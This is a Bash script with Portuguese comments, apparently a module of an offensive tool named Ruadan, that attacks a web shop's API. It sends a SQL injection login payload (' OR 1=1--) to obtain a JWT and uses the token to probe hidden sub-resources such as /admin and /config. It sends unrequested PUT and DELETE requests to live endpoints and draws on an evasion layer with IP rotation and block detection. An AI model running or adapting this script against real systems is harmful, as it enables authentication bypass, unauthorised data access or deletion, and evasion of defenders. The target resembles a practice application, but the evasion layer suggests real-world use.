#!/bin/bash
# ==============================================================================
# Ruadan — Fuzzing Recursivo de Conteúdo (sub-recursos + métodos não doc)
# ==============================================================================
# Uso: recursive_fuzz.sh <target> <port> <scheme>
#
# POR QUE: fuzzers tradicionais fazem UMA passada na raiz. Aplicações modernas
# têm hierarquias de API: /api/ → /api/Users → /api/Users/1 → /api/Users/1/orders
# Este script:
#   1. Descobre endpoints da raiz (GET /) e das APIs conhecidas (/api, /rest)
#   2. Para CADA endpoint que responde 200, fuzza sub-recursos (1,2,3 / search, list, all)
#   3. Testa métodos não documentados (PUT/DELETE/PATCH em GET endpoints)
#   4. Testa Content-Types alternativos (XML, form-data, plain text)
# Emite: RECURSIVE_FINDING: <tipo> <endpoint> <detalhe>
#
# EVASÃO (evasion_lib.sh): budget global, jitter, detecção de bloqueio com
# rotação de IP, 1 request onde antes eram 2, orçamento de tempo por porta,
# pula portas emuladas, aborto gracioso. enabled=0 → padrão idêntico.
# ==============================================================================
set -u

TARGET="${1:?uso: recursive_fuzz.sh <target> <port> <scheme>}"
PORT="${2:-80}"
SCHEME="${3:-http}"
CURL_OPTS="-sk --max-time 15"

# ---- Camada de evasão -----------------------------------------------------------
_EV_LIB="$(dirname "${BASH_SOURCE[0]}")/evasion_lib.sh"
[ -f "$_EV_LIB" ] || _EV_LIB="/ruadan/evasion_lib.sh"
. "$_EV_LIB"
ev_init "$TARGET" "$PORT" "$SCHEME"
ev_skip_port && exit 0
ev_should_abort && exit 0

BASE_URL="${SCHEME}://${TARGET}:${PORT}"
if [ "$SCHEME" = "http" ]; then
    _redir=$(curl $CURL_OPTS ${EV__IDA[@]+"${EV__IDA[@]}"} -o /dev/null -w "%{redirect_url}" "${BASE_URL}/" 2>/dev/null)
    if [ -n "$_redir" ] && [[ "$_redir" == https* ]]; then
        BASE_URL="${_redir%/}"
    fi
fi
ev_set_probe_url "${BASE_URL}/"
echo "[recursive-fuzz] Alvo: ${BASE_URL}"

# Captura JWT
LOGIN_BODY='{"email":"'"'"' OR 1=1--","password":"x"}'
ev_body $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" -H "Content-Type: application/json" -d "$LOGIN_BODY"
LOGIN_RESP="$EV_BODY"
JWT=$(echo "$LOGIN_RESP" | grep -oE '"token":"[^"]+"' | sed 's/"token":"//;s/"$//' | head -1)
AUTH=""
[ -n "$JWT" ] && AUTH="Authorization: Bearer ${JWT}"
echo "[recursive-fuzz] JWT: ${#JWT} chars"

VULN_COUNT=0

# ---- 1. Endpoints raiz para expandir recursivamente ------------------------------
ROOT_ENDPOINTS=(
    "/api"
    "/api/Users"
    "/api/Products"
    "/api/Orders"
    "/rest/products"
    "/rest/user/whoami"
    "/rest/products/search?q=a"
)

SUB_RESOURCES=("" "/1" "/2" "/3" "/search" "/list" "/all" "/count" "/admin" "/debug" "/config" "/schema" "/_search" "/bulk")

for ROOT in "${ROOT_ENDPOINTS[@]}"; do
    ev_should_abort && exit 0
    # Verifica se o endpoint raiz responde
    ev_code $CURL_OPTS -H "$AUTH" "${BASE_URL}${ROOT}"
    ROOT_CODE="$EV_CODE"
    [ "$ROOT_CODE" != "200" ] && [ "$ROOT_CODE" != "500" ] && continue

    echo "[recursive-fuzz] Expandindo ${ROOT} (HTTP ${ROOT_CODE})..."

    for SUB in "${SUB_RESOURCES[@]}"; do
        ev_should_abort && exit 0
        EP="${ROOT}${SUB}"
        ev_code_size $CURL_OPTS -H "$AUTH" "${BASE_URL}${EP}"
        CODE="$EV_CODE"; SIZE="$EV_SIZE"

        if [ "$CODE" = "200" ] && [ "$SIZE" -gt 50 ]; then
            echo "RECURSIVE_FINDING: GET ${EP} (HTTP ${CODE}, ${SIZE}B) — sub-recurso acessível"
            VULN_COUNT=$((VULN_COUNT+1))
        elif [ "$CODE" = "500" ]; then
            echo "RECURSIVE_FINDING: GET ${EP} (HTTP ${CODE}) — erro interno (endpoint existe mas quebra)"
            VULN_COUNT=$((VULN_COUNT+1))
        fi
    done
done

# ---- 2. Métodos não documentados ------------------------------------------------
echo "[recursive-fuzz] Testando métodos não documentados..."

METHODS=("PUT" "DELETE" "PATCH" "HEAD" "OPTIONS")

for EP in "${ROOT_ENDPOINTS[@]}"; do
    ev_should_abort && exit 0
    ev_code $CURL_OPTS -H "$AUTH" "${BASE_URL}${EP}"
    GET_CODE="$EV_CODE"
    for METHOD in "${METHODS[@]}"; do
        ev_should_abort && exit 0
        ev_code $CURL_OPTS -X "$METHOD" -H "$AUTH" -H "Content-Type: application/json" \
            -d '{"test":"ruadan"}' "${BASE_URL}${EP}"
        M_CODE="$EV_CODE"
        # Se o método é aceito (não 405 Method Not Allowed) e difere de GET
        if [ "$M_CODE" != "405" ] && [ "$M_CODE" != "404" ] && [ "$M_CODE" != "501" ]; then
            if [ "$M_CODE" != "$GET_CODE" ] || [ "$METHOD" = "DELETE" ] || [ "$METHOD" = "PUT" ]; then
                echo "RECURSIVE_FINDING: METHOD_ALLOWED ${METHOD} ${EP} (HTTP ${M_CODE} vs GET ${GET_CODE}) — método não documentado aceito"
                VULN_COUNT=$((VULN_COUNT+1))
            fi
        fi
    done
done

# ---- 3. Content-Type alternativo --------------------------------------------------
echo "[recursive-fuzz] Testando Content-Types alternativos..."

CONTENT_TYPES=(
    "application/xml"
    "application/x-www-form-urlencoded"
    "text/plain"
    "multipart/form-data; boundary=ruadan"
)

for EP in "/rest/user/login" "/api/Users" "/rest/save/review"; do
    ev_should_abort && exit 0
    for CT in "${CONTENT_TYPES[@]}"; do
        ev_should_abort && exit 0
        ev_body_and_code $CURL_OPTS -X POST "${BASE_URL}${EP}" -H "Content-Type: ${CT}" -d "email=test&password=test"
        CODE="$EV_CODE"
        if [ "$CODE" = "200" ]; then
            echo "RECURSIVE_FINDING: CONTENT_TYPE ${CT} em ${EP} — aceito (HTTP ${CODE})"
            VULN_COUNT=$((VULN_COUNT+1))
        fi
    done
done

echo "[recursive-fuzz] Descobertas recursivas: ${VULN_COUNT}"
exit 0
